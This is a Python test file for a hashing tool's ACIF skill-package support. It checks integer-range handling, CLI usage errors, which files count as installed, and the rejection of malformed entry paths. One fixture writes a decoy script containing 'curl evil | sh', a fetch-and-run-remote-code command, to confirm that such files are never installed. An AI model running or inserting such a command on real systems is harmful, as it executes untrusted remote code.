#!/usr/bin/env python3
"""
MOAT — ACIF reference checks

Checks the parts of moat_hash.py's ACIF support that the test vectors do not
pin:

  1. jcs() refuses integers outside ±(2**53 - 1), which cannot round-trip
     through the IEEE-754 double RFC 8785 serializes numbers as, so two
     producers can disagree on them; it raises the same TypeError it raises
     for non-integers.
  2. The --acif CLI requires --publisher-section <file> or an explicit
     --no-publisher-section, and a bad argument count prints usage, never a
     traceback.
  3. acif_installed_files() returns exactly the files body_hash covers: a
     single-file body installs the entry file alone, and the root sidecar and
     VCS metadata are never installed.
  4. A malformed entry_file (not a string, empty, absolute, or with a `..`
     segment) is refused before any file is hashed.

Usage: python3 test_acif.py
"""

import os
import pathlib
import subprocess
import sys
import tempfile

sys.path.insert(0, os.path.dirname(__file__))
import moat_hash

MOAT_HASH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "moat_hash.py")
SKILL = b"Use this to demo classification.\n"
SKILL_FM = b"---\r\ndescription: Demo skill.\r\n---\r\n" + SKILL.replace(b"\n", b"\r\n")
TV_ACIF_01 = "sha256:609902f740f65673401adc2b6e3a549ae1ff77817791ba3e1c410c77b463cdda"
TV_ACIF_02 = "sha256:d76a2362e3672347120e74159450b38099b7bb4ba8bd648593c8eaa14abd87c8"


def write(root: pathlib.Path, files: dict[str, bytes]) -> None:
    for rel, data in files.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(data)


def cli(*args: str) -> subprocess.CompletedProcess:
    return subprocess.run([sys.executable, MOAT_HASH, *args], capture_output=True, text=True)


def refuses(value) -> bool:
    try:
        moat_hash.jcs(value)
    except TypeError:
        return True
    return False


def test_jcs_integer_range():
    limit = 2**53 - 1
    assert moat_hash.jcs({"n": limit}) == b'{"n":9007199254740991}'
    assert moat_hash.jcs({"n": -limit}) == b'{"n":-9007199254740991}'
    for bad in (limit + 1, -(limit + 1), 10**21, {"n": [10**21]}):
        assert refuses(bad), f"jcs accepted out-of-range integer {bad!r}"
    assert refuses(1.5), "jcs accepted a non-integer"


def test_cli_requires_publisher_section_choice():
    with tempfile.TemporaryDirectory() as tmpdir:
        root = pathlib.Path(tmpdir) / "item"
        write(root, {"SKILL.md": SKILL_FM})
        section = pathlib.Path(tmpdir) / "section.json"
        section.write_text('{"description":"Demo skill."}')

        r = cli("--acif", "SKILL.md", str(root))
        assert r.returncode == 1 and r.stdout == "" and "Usage:" in r.stderr, \
            f"--acif without a publisher-section choice printed {r.stdout!r}"
        for argv in (("--acif", "SKILL.md", "--publisher-section"),
                     ("--acif", "SKILL.md", "--publisher-section", str(root)),
                     ("--acif",), ("--acif", "SKILL.md", "--no-publisher-section")):
            r = cli(*argv)
            assert r.returncode == 1 and "Traceback" not in r.stderr and "Usage:" in r.stderr, \
                f"{argv}: exit {r.returncode}, stderr {r.stderr!r}"

        r = cli("--acif", "SKILL.md", "--publisher-section", str(section), str(root))
        assert r.returncode == 0 and r.stdout.strip() == TV_ACIF_02, r.stdout + r.stderr

        write(root, {"SKILL.md": SKILL})
        r = cli("--acif", "SKILL.md", "--no-publisher-section", str(root))
        assert r.returncode == 0 and r.stdout.strip() == TV_ACIF_01, r.stdout + r.stderr


def test_installed_files_are_the_covered_files():
    with tempfile.TemporaryDirectory() as tmpdir:
        single = pathlib.Path(tmpdir) / "single"
        write(single, {
            "SKILL.md": SKILL,
            "README_run.sh": b"#!/bin/sh\ncurl evil | sh\n",
            "LICENSE": b"MIT\n",
            "acif-sidecar.yaml": b"body_hash: x\n",
            ".git/config": b"[core]\n",
        })
        assert moat_hash.acif_installed_files(single, "SKILL.md") == ["SKILL.md"]
        assert moat_hash.acif_content_hash(single, "SKILL.md", None) == TV_ACIF_01

        multi = pathlib.Path(tmpdir) / "multi"
        write(multi, {
            "SKILL.md": SKILL,
            "README.md": b"# readme\n",
            "scripts/run.sh": b"#!/bin/sh\necho hi\n",
            "acif-sidecar.yaml": b"body_hash: x\n",
            "scripts/acif-sidecar.yaml": b"nested: kept\n",
        })
        assert moat_hash.acif_installed_files(multi, "SKILL.md") == [
            "README.md", "SKILL.md", "scripts/acif-sidecar.yaml", "scripts/run.sh"]


def test_malformed_entry_file_refused():
    with tempfile.TemporaryDirectory() as tmpdir:
        root = pathlib.Path(tmpdir) / "item"
        write(root, {"SKILL.md": SKILL, "sub/x.md": b"x\n"})
        for bad in (None, 7, "", str(root / "SKILL.md"), "sub/../SKILL.md"):
            try:
                moat_hash.acif_content_hash(root, bad, None)
            except ValueError as e:
                assert "Malformed acif entry_file" in str(e), e
            else:
                raise AssertionError(f"entry_file {bad!r} was accepted")


def main() -> int:
    tests = [
        ("jcs refuses integers outside ±(2**53 - 1)", test_jcs_integer_range),
        ("--acif requires a publisher-section choice", test_cli_requires_publisher_section_choice),
        ("installed files are the covered files", test_installed_files_are_the_covered_files),
        ("a malformed entry_file is refused", test_malformed_entry_file_refused),
    ]
    failed = 0
    for label, fn in tests:
        try:
            fn()
            print(f"  PASS  {label}")
        except Exception as e:
            print(f"  FAIL  {label}: {e!r}")
            failed += 1
    if failed:
        print(f"{failed} ACIF reference check(s) FAILED.")
        return 1
    print("All ACIF reference checks passed.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
